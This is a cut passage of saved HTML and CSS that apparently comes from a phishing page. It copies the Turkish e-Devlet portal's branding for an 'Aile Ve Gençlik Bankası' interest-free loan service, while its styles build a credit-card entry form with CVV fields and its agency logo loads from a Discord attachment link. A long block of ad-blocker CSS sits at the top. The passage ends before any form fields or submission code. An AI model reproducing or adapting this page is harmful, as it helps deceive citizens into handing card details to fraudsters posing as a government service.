:root a[href^="http://bs.serving-sys.com/"], :root a[href^="http://cpaway.afftrack.com/"], :root a[href^="http://cdn.adsrvmedia.net/"], :root [lazy-ad="top_banner"], :root a[href^="http://360ads.go2cloud.org/"], :root [href^="https://infinitytrk.com/"], :root [onclick^="location.href='http://www.reimageplus.com"], :root a[href^="http://dftrck.com/"], :root a[href^="http://casino-x.com/?partner"], :root a[href^="https://meet-sexhere.com/"], :root a[href^="http://record.sportsbetaffiliates.com.au/"], :root a[href^="http://campeeks.com/"][href*="&utm_"], :root a[href^="http://download-performance.com/"], :root a[href^="http://www.on2url.com/app/adtrack.asp"], :root [href^="https://affect3dnetwork.com/track/"], :root a[href^="http://campaign.bharatmatrimony.com/cbstrack/"], :root a[href^="https://go.goaserv.com/"], :root a[href^="http://serve.williamhill.com/promoRedirect?"], :root a[href^="https://uncensored.game/"], :root a[href^="http://www.seekbang.com/cs/"], :root a[href^="http://syndication.exoclick.com/"], :root a[href^="http://bluehost.com/track/"], :root [href^="https://www.dcpodj3k5.com/"], :root a[href^="https://serve.awmdelivery.com/"], :root a[href^="http://enter.anabolic.com/track/"], :root a[href^="https://prf.hn/click/"][href*="/adref:"] > img, :root a[href^="http://banners.victor.com/processing/"], :root a[href^="https://zononi.com/"], :root a[href^="https://reinstandpointdumbest.com/"], :root a[href*="//lkstrck2.com/"], :root div[aria-label="Ads"], :root a[href^="https://go.ebrokerserve.com/"], :root a[href^="http://axdsz.pro/"], :root a[href^="http://api.content.ad/"], :root a[href^="https://leg.xyz/?track="], :root a[href^="http://affiliate.glbtracker.com/"], :root a[href^="https://transfer.xe.com/signup/track/redirect?"], :root a[href^="http://anonymous-net.com/"], :root a[href^="https://www.popads.net/users/"], :root a[href^="http://adultfriendfinder.com/p/register.cgi?pid="], :root a[href^="http://www.advcashpro.com/aff/"], :root a[href^="http://aflrm.com/"], :root a[href^="http://affiliates.thrixxx.com/"], :root #atvcap + #tvcap > .mnr-c > .commercial-unit-mobile-top, :root a[href^="http://affiliates.lifeselector.com/"], :root [class^="amp-ad-"], :root a[href^="http://aff.ironsocket.com/"], :root a[href^="http://tour.mrskin.com/"], :root [href^="http://www.mypillow.com/"] > img, :root a[href^="http://linksnappy.com/?ref="], :root ad-desktop-sidebar, :root [data-ad-width], :root [id*="MGWrap"], :root a[href^="http://adtrack123.pl/"], :root a[href^="http://adsrv.keycaptcha.com"], :root a[href^="http://adserving.unibet.com/"], :root a[href^="https://secure.adnxs.com/clktrb?"], :root div[data-mpu1], :root a[href^="http://adserver.adtechus.com/"], :root a[href^="http://galleries.securewebsiteaccess.com/"], :root a[href^="http://stateresolver.link/"], :root guj-ad, :root AMP-AD, :root a[href^="https://go.xxxiijmp.com"], :root div[class^="StickyHeroAdWrapper-"], :root a[href^="http://cwcams.com/landing/click/"], :root a[href^="http://ads.betfair.com/redirect.aspx?"], :root a[href^="http://adserver.adreactor.com/"], :root a[href^="http://ads.sprintrade.com/"], :root .section-subheader > .section-hotel-prices-header, :root a[href^="http://landingpagegenius.com/"], :root [href^="https://click2cvs.com/"], :root a[href^="http://ads.expekt.com/affiliates/"], :root a[href^="http://adclick.g.doubleclick.net/"], :root a[href^="http://ad.yieldmanager.com/"], :root [href^="http://homemoviestube.com/"], :root a[href^="http://ad.doubleclick.net/"], :root a[href^="http://1phads.com/"], :root a[href^="http://s5prou7ulr.com/"], :root a[href^="http://azmobilestore.co/"], :root iframe[src^="http://ad.yieldmanager.com/"], :root a[href^="https://porntubemate.com/"], :root a[href^="http://pubads.g.doubleclick.net/"], :root a[href^="//www.pd-news.com/"], :root a[href^="https://syndication.dynsrvtbg.com/"], :root a[href^="http://vinfdv6b4j.com/"], :root div[data-test-id="AdBannerWrapper"], :root div[class^="AdCard_"], :root a[href^="http://www.urmediazone.com/signup"], :root a[href^="http://click.plista.com/pets"], :root a[href^="https://www.awin1.com/cread.php?awinaffid="], :root [href^="http://www.fleshlightgirls.com/"], :root a[href^="http://www.menaon.com/installs/"], :root a[href^="//syndication.dynsrvtbg.com/"], :root a[href^="http://srvpub.com/"], :root a[href^="https://go.nordvpn.net/aff"] > img, :root a[href^="http://secure.vivid.com/track/"], :root a[href^="http://see-work.info/"], :root a[href^="https://www.friendlyduck.com/AF_"], :root [href^="http://advertisesimple.info/"], :root a[href^="http://www.pinkvisualpad.com/?revid="], :root a[href^="https://www.oneclickroot.com/?tap_a="] > img, :root DFP-AD, :root a[href^="//porngames.adult/?SID="], :root a[href^="https://go.hpyrdr.com/"], :root a[href^="https://billing.purevpn.com/aff.php"] > img, :root a[href^="//lambingsyddir.com/"], :root a[href^="https://go.julrdr.com/"], :root [id^="chp_ads_block"], :root .trc_rbox_div .syndicatedItemUB, :root [href^="https://totlnkcl.com/"], :root a[href^="https://cpartner.bdswiss.com/"], :root [href*="http://MyPillow.com"] > img, :root a[href^="//agacelebir.com/"], :root a[href^="http://play4k.co/"], :root a[data-redirect^="https://paid.outbrain.com/network/redir?"], :root a[href^="http://www.roboform.com/php/land.php"], :root a[href="//rufflycouncil.com/"], :root a[href^="http://xads.zedo.com/"], :root a[href^="https://adsrv4k.com/"], :root a[href^="http://trk.mdrtrck.com/"], :root a[href*="https://www.sweetdeals.com/"] img, :root a[href*=".zlink9.com/"], :root a[href^="https://trackjs.com/?utm_source"], :root AFS-AD, :root a[href^="https://ads.ad4game.com/"], :root a[href^="https://affiliates.bet-at-home.com/processing/"], :root a[href^="https://betway.com/"][href*="&a="], :root a[href^="http://www.mobileandinternetadvertising.com/"], :root a[href^="http://www.downloadthesefiles.com/"], :root a[href^="http://secure.cbdpure.com/aff/"], :root [href^="https://join.playboyplus.com/track/"], :root a[data-url^="http://paid.outbrain.com/network/redir?"] + .author, :root a[href^="http://affiliates.score-affiliates.com/"], :root a[data-oburl^="https://paid.outbrain.com/network/redir?"], :root a[href^="https://ttf.trmobc.com/"], :root a[href^="http://n.admagnet.net/"], :root a[data-obtrack^="http://paid.outbrain.com/network/redir?"], :root a[href^="https://go.onclasrv.com/"], :root a[href^="http://wct.link/"], :root a[href^="http://www.TwinPlan.com/AF_"], :root div[id^="ad-position-"], :root a[href^="http://liversely.com/"], :root a[data-redirect^="this.href='http://paid.outbrain.com/network/redir?"], :root [href^="https://goldforyourfuture.com/clk.trk"] img, :root [href="https://masstortfinancing.com"] img, :root [href^="https://bulletprofitsmartlink.com/"], :root [href^="https://join3.bannedsextapes.com"], :root a[href^="//benoopto.com/"], :root [lazy-ad="leftbottom_banner"], :root [id^="div-gpt-ad"], :root [data-m-ad-id], :root a[href^="http://espn.zlbu.net/"], :root a[href^="http://admrotate.iplayer.org/"], :root [href^="http://join.rodneymoore.com/"], :root [id*="MarketGid"], :root a[href^="http://c.ketads.com/"], :root a[href^="http://www.badoink.com/go.php?"], :root .commercial-unit-mobile-top > div[data-pla="1"], :root a[href^="https://secure.starsaffiliateclub.com/C.ashx?"], :root [href^="https://zone.gotrackier.com/"], :root div[class^="kiwi-ad-wrapper"], :root a[href^="https://rev.adsession.com/"], :root [href^="https://www.mystore.com/"] > img, :root [href^="https://www.mypillow.com/"] > img, :root [href^="https://www.herbanomic.com/"] > img, :root [href^="https://freecourseweb.com/"] > .sitefriend, :root [href^="https://www.hostg.xyz/aff_c"] > img, :root [href*=".engine.adglare.net/"], :root a[href^="http://allaptair.club/"], :root a[href^="https://ptapjmp.com/"], :root a[href^="http://xtgem.com/click?"], :root a[href^="http://bc.vc/?r="], :root [href^="https://www.brighteonstore.com/products/"] img, :root a[href^="https://servedbyadbutler.com/"], :root a[href^="https://www.bet365.com/"][href*="affiliate="], :root a[href^="https://mob1ledev1ces.com/"], :root a[href^="https://promo-bc.com/"], :root a[data-redirect^="http://paid.outbrain.com/network/redir?"], :root a[href^="https://explore.findanswersnow.net/"], :root [id^="adframe_wrap_"], :root div[jsdata*="CarouselPLA-"][data-id^="CarouselPLA-"], :root a[href^="https://go.trackitalltheway.com/"], :root [data-template-type="nativead"], :root [href^="https://track.fiverr.com/visit/"] > img, :root a[href^="//eurogirls.live/track?"], :root a[href^="http://affiliate.coral.co.uk/processing/"], :root [href^="https://t.ajrkm.link/"], :root [data-ad-manager-id], :root a[href^="http://www.firstclass-download.com/"], :root [id*="ScriptRoot"], :root a[href^="http://fileboom.me/pr/"], :root a[href^="//coarsewary.com/"], :root [href^="https://mystore.com/"] > img, :root a[href*=".trust.zone"], :root [href^="http://globsads.com/"], :root [href^="https://shrugartisticelder.com"], :root a[href^="https://traffic.bannerator.com/"], :root [href^="https://shiftnetwork.infusionsoft.com/go/"] > img, :root a[href^="https://vo2.qrlsx.com/"], :root a[href^="https://tracking.truthfinder.com/?a="], :root .scroll-fixable.rail-right > .deals-rail, :root a[href*=".flndmyiove.net/"], :root a[href^="http://www.xmediaserve.com/"], :root [href^="https://mypatriotsupply.com/"] > img, :root [href^="https://mylead.global/stl/"] > img, :root a[href^="http://affiliates.pinnaclesports.com/processing/"], :root .vid-present > .van_vid_carousel__padding, :root #header + #content > #left > #rlblock_left, :root [href^="https://ilovemyfreedoms.com/landing-"], :root a[href^="https://5hjdbfjfd5.monster/"], :root [href^="http://join.ts-dominopresley.com/"], :root [href^="https://go.affiliatexe.com/"], :root [href^="https://go.4rabettraff.com/"], :root a[href^="https://a.bestcontentfood.top/"], :root #ads > .dose > .dosesingle, :root a[data-url^="http://paid.outbrain.com/network/redir?"], :root [href^="https://cpa.10kfreesilver.com/"], :root a[href^="https://delivery.porn.com/"], :root a[href^="https://www.firstload.com/affiliate/"], :root .trc_related_container div[data-item-syndicated="true"], :root a[href^="https://freeadult.games/"], :root a[href^="http://liversely.net/"], :root a[href^="http://www.coiwqe.site/"], :root a[href^="http://mgid.com/"], :root [href^="http://join.trannies-fuck.com/"], :root a[href^="http://k2s.cc/pr/"], :root [href^="/admdownload.php"], :root [href^="http://join.hardcoreshemalevideo.com/"], :root a[href^="http://ads2.williamhill.com/redirect.aspx?"], :root div[data-native-ad], :root a[href^="https://click.hoolig.app/"], :root AD-TRIPLE-BOX, :root a[href^="//www.mgid.com/"], :root [href^="https://go.astutelinks.com/"], :root [href^="http://join.shemale.xxx/"], :root div[id^="vuukle-ad-"], :root a[href^="http://betahit.click/"], :root [class^="chp_ads_block"], :root a[href^="http://www.gfrevenge.com/landing/"], :root a[href^="http://hpn.houzz.com/"], :root [name^="google_ads_iframe"], :root a[href^="http://www.afgr2.com/"], :root #slashboxes > .deals-rail, :root a[href^="https://deliver.ptgncdn.com/"], :root [href^="https://www.targetingpartner.com/"], :root a[href^="http://latestdownloads.net/download.php?"], :root #taw > .med + div > #tvcap > .mnr-c:not(.qs-ic) > .commercial-unit-mobile-top, :root .plista_widget_belowArticleRelaunch_item[data-type="pet"], :root a[href^="https://ak.hetaruwg.com/"], :root div[id^="sticky_ad_"], :root [href^="https://go.xlrdr.com"], :root a[href^="http://click.payserve.com/"], :root a[href^="https://sexsimulator.game/tab/?SID="], :root .rc-cta[data-target], :root a[href^="https://get.surfshark.net/aff_c?"][href*="&aff_id="] > img, :root [href^="https://kingered-banctours.com/"], :root a[href^="http://k2s.cc/code/"], :root a[href^="https://webroutetrk.com/"], :root [href^="//mage98rquewz.com/"], :root #leader-companion > a[href], :root [href^="https://traffserve.com/"], :root a[href^="http://media.paddypower.com/redirect.aspx?"], :root a[href^="http://www.flashx.tv/downloadthis"], :root a[href^="https://www.spyoff.com/"], :root [href^="http://mypillow.com/"] > img, :root a[href^="https://a.adtng.com/"], :root a[href^="http://static.fleshlight.com/images/banners/"], :root div[id^="zergnet-widget"], :root [href="https://www.masstortfinancing.com/"] > img, :root [href^="https://rapidgator.net/article/premium/ref/"], :root a[href^="https://www.g4mz.com/"], :root a[href^="http://webgirlz.online/landing/"], :root a[href^="https://goraps.com/"], :root a[href^="https://farm.plista.com/pets"], :root LEADERBOARD-AD, :root [data-mobile-ad-id], :root [class^="Ad-adContainer"], :root a[href^="https://adclick.g.doubleclick.net/"], :root app-ad, :root [href^="http://misslinkvocation.com/"], :root [id^="ad-wrap-"], :root a[href^="https://go.tmrjmp.com"], :root [data-css-class="dfp-inarticle"], :root a[href^="http://eclkmpsa.com/"], :root a[href^="http://papi.mynativeplatform.com:80/pub2/"], :root a[href^="http://cam4com.go2cloud.org/aff_c?"], :root a[href^="http://get.slickvpn.com/"], :root [data-ad-module], :root a[href^="http://bcp.crwdcntrl.net/"], :root [data-ad-cls], :root a[href^="https://chaturbate.jjgirls.com/?track="], :root [class^="s2nPlayer"], :root [class*="__adv-block"], :root a[href^="https://www.adxtro.com/"], :root .commercial-unit-mobile-top .jackpot-main-content-container > .UpgKEd + .nZZLFc > div > .vci, :root a[href^="http://paid.outbrain.com/network/redir?"], :root a[href^="https://track.trkinator.com/"], :root [href^="http://residenceseeingstanding.com/"], :root .trc_rbox_border_elm .syndicatedItem, :root a[href^="http://www.myfreepaysite.com/sfw_int.php?aid"], :root [href^="https://glersakr.com/"], :root a[href^="https://t.mobtya.com/"], :root .trc_rbox_div .syndicatedItem, :root a-ad, :root hl-adsense, :root div[data-contentexchange-widget], :root [id^="bunyad-widget-ads-"], :root a[href^="https://mmwebhandler.aff-online.com/"], :root [href^="https://r.kraken.com/"], :root [href^="https://clk.right-wing-health.com/"], :root a[href^="http://hotcandyland.com/partner/"], :root [lazy-ad="lefttop_banner"], :root a[href^="https://secure.cbdpure.com/aff/"], :root a[href^="http://goldmoney.com/?gmrefcode="], :root .plistaList > .plista_widget_underArticle_item[data-type="pet"], :root [href^="https://join.girlsoutwest.com/"], :root a[href^="https://torguard.net/aff.php"] > img, :root a[href^="https://go.247traffic.com/"], :root amp-ad-custom, :root [href^="https://antiagingbed.com/discount/"] > img, :root [class^="AdvertisingSlot_"], :root [href^="http://trafficare.net/"], :root div[id^="crt-"][style], :root a[href^="http://igromir.info/"], :root div[id^="div-ads-"], :root a[onmousedown^="this.href='https://paid.outbrain.com/network/redir?"][target="_blank"] + .ob_source, :root a[href^="http://at.atwola.com/"], :root [href^="https://engine.gettopple.com/"], :root a[href^="http://fsoft4down.com/"], :root div[id^="ad_bigbox_"], :root #content > #right > .dose > .dosesingle, :root [href^="https://affiliate.fastcomet.com/"] > img, :root a[href^="https://intrev.co/"], :root a[href^="http://https://www.get-express-vpn.com/offer/"], :root a[href^="https://misspkl.com/"], :root a[href^="https://ad.zanox.com/ppc/"] > img, :root [href^="http://clicks.totemcash.com/"], :root a[href^="https://black77854.com/"], :root #topstuff > #tads, :root a[href^="https://ismlks.com/"], :root [data-freestar-ad], :root [class*="__adspot-title-container"], :root a[href^="https://www.sheetmusicplus.com/?aff_id="], :root [href^="https://mypillow.com/"] > img, :root [class^="div-gpt-ad"] { display: none !important; }</style><script type="text/javascript" async="" src="themes/izmir/js/es/common_messages_tr.1.8.js"></script><script type="text/javascript" async="" src="/themes/izmir/js/es/form_messages_tr.1.8.js"></script></head>
           <body data-version=".1.8" data-token="{D41CB5-B8972C-304E26-6232C5-16AEF0-F853CD-2F89BB-22AD47}" data-unique="2053938d9fe185cce49e8354274f6346" data-level="0" data-page="ilksan-aidat-bilgileri-sorgulama" data-lang="tr_TR.UTF-8" style="visibility: visible; overflow: auto;">
        <header id="top" class=" sticky_init">
            <div class="headerGroup">
                <div id="accesibilityBlock">
                    <a href="#pageContentBlock" accesskey="1">İçeriğe Git</a>
                    <a href="/" accesskey="2">Ana Sayfa</a>
                </div>

                <h1 id="brandingBlock">
                    <a id="homeLink" href="/" title="Ana Sayfa'ya Dönüş">e-Devlet Kapısı</a>
                </h1>

            </div>
			<style>
			@import url("https://fonts.googleapis.com/css?family=Source+Code+Pro:400,500,600,700|Source+Sans+Pro:400,600,700&display=swap");


body {
  background: #ddeefc;
  font-family: "Source Sans Pro", sans-serif;
  font-size: 16px;
}
* {
  box-sizing: border-box;
  &:focus {
    outline: none;
  }
}
.wrapper {
  min-height: 100vh;
  display: flex;
  padding: 50px 15px;
  @media screen and (max-width: 700px), (max-height: 500px) {
    flex-wrap: wrap;
    flex-direction: column;
  }
}

.card-form {
  max-width: 570px;
  margin: auto;
  width: 100%;

  @media screen and (max-width: 576px) {
    margin: 0 auto;
  }

  &__inner {
    background: #fff;
    // box-shadow: 3px 13px 30px 0px rgba(21, 34, 67, 0.2);
    box-shadow: 0 30px 60px 0 rgba(90, 116, 148, 0.4);
    border-radius: 10px;
    padding: 35px;
    padding-top: 180px;

    @media screen and (max-width: 480px) {
      padding: 25px;
      padding-top: 165px;
    }
    @media screen and (max-width: 360px) {
      padding: 15px;
      padding-top: 165px;
    }
  }

  &__row {
    display: flex;
    align-items: flex-start;
    @media screen and (max-width: 480px) {
      flex-wrap: wrap;
    }
  }

  &__col {
    flex: auto;
    margin-right: 35px;

    &:last-child {
      margin-right: 0;
    }

    @media screen and (max-width: 480px) {
      margin-right: 0;
      flex: unset;
      width: 100%;
      margin-bottom: 20px;

      &:last-child {
        margin-bottom: 0;
      }
    }

    &.-cvv {
      max-width: 150px;
      @media screen and (max-width: 480px) {
        max-width: initial;
      }
    }
  }

  &__group {
    display: flex;
    align-items: flex-start;
    flex-wrap: wrap;

    .card-input__input {
      flex: 1;
      margin-right: 15px;

      &:last-child {
        margin-right: 0;
      }
    }
  }

  &__button {
    width: 100%;
    height: 55px;
    background: #2364d2;
    border: none;
    border-radius: 5px;
    font-size: 22px;
    font-weight: 500;
    font-family: "Source Sans Pro", sans-serif;
    box-shadow: 3px 10px 20px 0px rgba(35, 100, 210, 0.3);
    color: #fff;
    margin-top: 20px;
    cursor: pointer;

    @media screen and (max-width: 480px) {
      margin-top: 10px;
    }
  }
}

.card-item {
  max-width: 430px;
  height: 270px;
  margin-left: auto;
  margin-right: auto;
  position: relative;
  z-index: 2;
  width: 100%;

  @media screen and (max-width: 480px) {
    max-width: 310px;
    height: 220px;
    width: 90%;
  }

  @media screen and (max-width: 360px) {
    height: 180px;
  }

  &.-active {
    .card-item__side {
      &.-front {
        transform: perspective(1000px) rotateY(180deg) rotateX(0deg)
          rotateZ(0deg);
      }
      &.-back {
        transform: perspective(1000px) rotateY(0) rotateX(0deg) rotateZ(0deg);
        // box-shadow: 0 20px 50px 0 rgba(81, 88, 206, 0.65);
      }
    }
  }

  &__focus {
    position: absolute;
    z-index: 3;
    border-radius: 5px;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    transition: all 0.35s cubic-bezier(0.71, 0.03, 0.56, 0.85);
    opacity: 0;
    pointer-events: none;
    overflow: hidden;
    border: 2px solid rgba(255, 255, 255, 0.65);

    &:after {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      background: rgb(8, 20, 47);
      height: 100%;
      border-radius: 5px;
      filter: blur(25px);
      opacity: 0.5;
    }

    &.-active {
      opacity: 1;
    }
  }

  &__side {
    border-radius: 15px;
    overflow: hidden;
    // box-shadow: 3px 13px 30px 0px rgba(11, 19, 41, 0.5);
    box-shadow: 0 20px 60px 0 rgba(14, 42, 90, 0.55);
    transform: perspective(2000px) rotateY(0deg) rotateX(0deg) rotate(0deg);
    transform-style: preserve-3d;
    transition: all 0.8s cubic-bezier(0.71, 0.03, 0.56, 0.85);
    backface-visibility: hidden;
    height: 100%;

    &.-back {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      transform: perspective(2000px) rotateY(-180deg) rotateX(0deg) rotate(0deg);
      z-index: 2;
      padding: 0;
      // background-color: #2364d2;
      // background-image: linear-gradient(
      //   43deg,
      //   #4158d0 0%,
      //   #8555c7 46%,
      //   #2364d2 100%
      // );
      height: 100%;

      .card-item__cover {
        transform: rotateY(-180deg)
      }
    }
  }
  &__bg {
    max-width: 100%;
    display: block;
    max-height: 100%;
    height: 100%;
    width: 100%;
    object-fit: cover;
  }
  &__cover {
    height: 100%;
    background-color: #1c1d27;
    position: absolute;
    height: 100%;
    background-color: #1c1d27;
    left: 0;
    top: 0;
    width: 100%;
    border-radius: 15px;
    overflow: hidden;
    &:after {
      content: "";
      position: absolute;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background: rgba(6, 2, 29, 0.45);
    }
  }

  &__top {
    display: flex;
    align-items: flex-start;
    justify-content: space-between;
    margin-bottom: 40px;
    padding: 0 10px;

    @media screen and (max-width: 480px) {
      margin-bottom: 25px;
    }
    @media screen and (max-width: 360px) {
      margin-bottom: 15px;
    }
  }

  &__chip {
    width: 60px;
    @media screen and (max-width: 480px) {
      width: 50px;
    }
    @media screen and (max-width: 360px) {
      width: 40px;
    }
  }

  &__type {
    height: 45px;
    position: relative;
    display: flex;
    justify-content: flex-end;
    max-width: 100px;
    margin-left: auto;
    width: 100%;

    @media screen and (max-width: 480px) {
      height: 40px;
      max-width: 90px;
    }
    @media screen and (max-width: 360px) {
      height: 30px;
    }
  }

  &__typeImg {
    max-width: 100%;
    object-fit: contain;
    max-height: 100%;
    object-position: top right;
  }

  &__info {
    color: #fff;
    width: 100%;
    max-width: calc(100% - 85px);
    padding: 10px 15px;
    font-weight: 500;
    display: block;

    cursor: pointer;

    @media screen and (max-width: 480px) {
      padding: 10px;
    }
  }

  &__holder {
    opacity: 0.7;
    font-size: 13px;
    margin-bottom: 6px;
    @media screen and (max-width: 480px) {
      font-size: 12px;
      margin-bottom: 5px;
    }
  }

  &__wrapper {
    font-family: "Source Code Pro", monospace;
    padding: 25px 15px;
    position: relative;
    z-index: 4;
    height: 100%;
    text-shadow: 7px 6px 10px rgba(14, 42, 90, 0.8);
    user-select: none;
    @media screen and (max-width: 480px) {
      padding: 20px 10px;
    }
  }

  &__name {
    font-size: 18px;
    line-height: 1;
    white-space: nowrap;
    max-width: 100%;
    overflow: hidden;
    text-overflow: ellipsis;
    text-transform: uppercase;
    @media screen and (max-width: 480px) {
      font-size: 16px;
    }
  }
  &__nameItem {
    display: inline-block;
    min-width: 8px;
    position: relative;
  }

  &__number {
    font-weight: 500;
    line-height: 1;
    color: #fff;
    font-size: 27px;
    margin-bottom: 35px;
    display: inline-block;
    padding: 10px 15px;
    cursor: pointer;

    @media screen and (max-width: 480px) {
      font-size: 21px;
      margin-bottom: 15px;
      padding: 10px 10px;
    }

    @media screen and (max-width: 360px) {
      font-size: 19px;
      margin-bottom: 10px;
      padding: 10px 10px;
    }
  }

  &__numberItem {
    width: 16px;
    display: inline-block;
    &.-active {
      width: 30px;
    }

    @media screen and (max-width: 480px) {
      width: 13px;

      &.-active {
        width: 16px;
      }
    }

    @media screen and (max-width: 360px) {
      width: 12px;

      &.-active {
        width: 8px;
      }
    }
  }

  &__content {
    color: #fff;
    display: flex;
    align-items: flex-start;
  }

  &__date {
    flex-wrap: wrap;
    font-size: 18px;
    margin-left: auto;
    padding: 10px;
    display: inline-flex;
    width: 80px;
    white-space: nowrap;
    flex-shrink: 0;
    cursor: pointer;

    @media screen and (max-width: 480px) {
      font-size: 16px;
    }
  }

  &__dateItem {
    position: relative;
    span {
      width: 22px;
      display: inline-block;
    }
  }

  &__dateTitle {
    opacity: 0.7;
    font-size: 13px;
    padding-bottom: 6px;
    width: 100%;

    @media screen and (max-width: 480px) {
      font-size: 12px;
      padding-bottom: 5px;
    }
  }
  &__band {
    background: rgba(0, 0, 19, 0.8);
    width: 100%;
    height: 50px;
    margin-top: 30px;
    position: relative;
    z-index: 2;
    @media screen and (max-width: 480px) {
      margin-top: 20px;
    }
    @media screen and (max-width: 360px) {
      height: 40px;
      margin-top: 10px;
    }
  }

  &__cvv {
    text-align: right;
    position: relative;
    z-index: 2;
    padding: 15px;
    .card-item__type {
      opacity: 0.7;
    }

    @media screen and (max-width: 360px) {
      padding: 10px 15px;
    }
  }
  &__cvvTitle {
    padding-right: 10px;
    font-size: 15px;
    font-weight: 500;
    color: #fff;
    margin-bottom: 5px;
  }
  &__cvvBand {
    height: 45px;
    background: #fff;
    margin-bottom: 30px;
    text-align: right;
    display: flex;
    align-items: center;
    justify-content: flex-end;
    padding-right: 10px;
    color: #1a3b5d;
    font-size: 18px;
    border-radius: 4px;
    box-shadow: 0px 10px 20px -7px rgba(32, 56, 117, 0.35);

    @media screen and (max-width: 480px) {
      height: 40px;
      margin-bottom: 20px;
    }

    @media screen and (max-width: 360px) {
      margin-bottom: 15px;
    }
  }
}

.card-list {
  margin-bottom: -130px;

  @media screen and (max-width: 480px) {
    margin-bottom: -120px;
  }
}

.card-input {
  margin-bottom: 20px;
  &__label {
    font-size: 14px;
    margin-bottom: 5px;
    font-weight: 500;
    color: #1a3b5d;
    width: 100%;
    display: block;
    user-select: none;
  }
  &__input {
    width: 100%;
    height: 50px;
    border-radius: 5px;
    box-shadow: none;
    border: 1px solid #ced6e0;
    transition: all 0.3s ease-in-out;
    font-size: 18px;
    padding: 5px 15px;
    background: none;
    color: #1a3b5d;
    font-family: "Source Sans Pro", sans-serif;

    &:hover,
    &:focus {
      border-color: #3d9cff;
    }

    &:focus {
      box-shadow: 0px 10px 20px -13px rgba(32, 56, 117, 0.35);
    }
    &.-select {
      -webkit-appearance: none;
      background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAeCAYAAABuUU38AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAUxJREFUeNrM1sEJwkAQBdCsngXPHsQO9O5FS7AAMVYgdqAd2IGCDWgFnryLFQiCZ8EGnJUNimiyM/tnk4HNEAg/8y6ZmMRVqz9eUJvRaSbvutCZ347bXVJy/ZnvTmdJ862Me+hAbZCTs6GHpyUi1tTSvPnqTpoWZPUa7W7ncT3vK4h4zVejy8QzM3WhVUO8ykI6jOxoGA4ig3BLHcNFSCGqGAkig2yqgpEiMsjSfY9LxYQg7L6r0X6wS29YJiYQYecemY+wHrXD1+bklGhpAhBDeu/JfIVGxaAQ9sb8CI+CQSJ+QmJg0Ii/EE2MBiIXooHRQhRCkBhNhBcEhLkwf05ZCG8ICCOpk0MULmvDSY2M8UawIRExLIQIEgHDRoghihgRIgiigBEjgiFATBACAgFgghEwSAAGgoBCBBgYAg5hYKAIFYgHBo6w9RRgAFfy160QuV8NAAAAAElFTkSuQmCC');
      background-size: 12px;
      background-position: 90% center;
      background-repeat: no-repeat;
      padding-right: 30px;
    }
  }
}

.slide-fade-up-enter-active {
  transition: all 0.25s ease-in-out;
  transition-delay: 0.1s;
  position: relative;
}
.slide-fade-up-leave-active {
  transition: all 0.25s ease-in-out;
  position: absolute;
}
.slide-fade-up-enter {
  opacity: 0;
  transform: translateY(15px);
  pointer-events: none;
}
.slide-fade-up-leave-to {
  opacity: 0;
  transform: translateY(-15px);
  pointer-events: none;
}

.slide-fade-right-enter-active {
  transition: all 0.25s ease-in-out;
  transition-delay: 0.1s;
  position: relative;
}
.slide-fade-right-leave-active {
  transition: all 0.25s ease-in-out;
  position: absolute;
}
.slide-fade-right-enter {
  opacity: 0;
  transform: translateX(10px) rotate(45deg);
  pointer-events: none;
}
.slide-fade-right-leave-to {
  opacity: 0;
  transform: translateX(-10px) rotate(45deg);
  pointer-events: none;
}



.github-btn {
  position: absolute;
  right: 40px;
  bottom: 50px;
  text-decoration: none;
  padding: 15px 25px;
  border-radius: 4px;
  box-shadow: 0px 4px 30px -6px rgba(36, 52, 70, 0.65);
  background: #24292e;
  color: #fff;
  font-weight: bold;
  letter-spacing: 1px;
  font-size: 16px;
  text-align: center;
  transition: all .3s ease-in-out;

  @media screen and (min-width: 500px) {
    &:hover {
      transform: scale(1.1);
      box-shadow: 0px 17px 20px -6px rgba(36, 52, 70, 0.36);
    }
  }

  @media screen and (max-width: 700px) {
    position: relative;
    bottom: auto;
    right: auto;
    margin-top: 20px;

    &:active {
      transform: scale(1.1);
      box-shadow: 0px 17px 20px -6px rgba(36, 52, 70, 0.36);
    }
  }
}
			</style>
			
			
        </header>
		

	<main id="serviceBlock" class="typeInsurance" style="margin-top: 105.344px;">
	
	<div id="vue">
				 <nav class="pageTabNavigation">
            <ul class="breadcrumbNavigation">
            	<li><a href="/" class="">Ana Sayfa</a></li>
            	            		            		<li><a href="">Aile Ve Gençlik Bankası</a></li>
            						            		            		<li class="here">Faizsiz Kredi,  Talep Belgesinin Verilmesi</li>
            						            </ul>
        </nav> 
    	<section id="pageContentBlock" class="themed">
		        <section class="serviceTitleBlock"><div class="serviceDetails">
				<img class="agencyLogo webp" src="https://cdn.discordapp.com/attachments/1117956402665750592/1117959109292085260/ilkevim_1.png" alt="" width="64" height="64"><h2>
				<a href="#">Aile Ve Gençlik Bankası</a><em>Faizsiz Kredi,  Talep Belgesinin Verilmesi</em></h2></div>
				<div class="serviceActions"><a id="" href="#" class="" data-match-height="serviceActs" style="height: 28.7969px;">
				<span class="flex_vertical_center"><i class=""></i><span class="serviceActions_maintitle _fav"> Favorilere ekle</span></span></a>
				<a data-modal="true" aria-label="Puanla" title="Puanla" data-modalclass="noclose" href="#" data-match-height="serviceActs" style="height: 28.7969px;" class="modalLink">
				<span class="flex_vertical_center"><i class=""></i><span class="serviceActions_maintitle">Puanla</span></span></a>
				<div class="share_item edk-popover-wrapper">
				<button class="share_button" id="share_button" data-match-height="serviceActs" style="height: 40.7969px;"><i class=""></i>
				<span class="serviceActions_maintitle">Paylaş</span></button><div class="share_menu" id="share_menu" data-match-height="serviceActs" style="display: none;">
				<a target="_blank" aria-label="paylaş" title="Twitter'da Paylaş" href=""><i class="ico-twitter"></i>
				<span class="serviceActions_maintitle">Twitter'da Paylaş</span></a>
				<a target="_blank" aria-label="paylaş" title="Facebook'da Paylaş" href=""><i class="ico-facebook"></i><span class="serviceActions_maintitle"> Facebook'da Paylaş</span></a></div></div></div></section>
				<aside id="serviceHelperBlock" style="" class="">
				<ul class="serviceIntroductionBlock"><li>Bu hizmet Aile Ve Gençlik Bankası işbirliği ile e-Devlet Kapısı altyapısı üzerinden sunulmaktadır.</li>
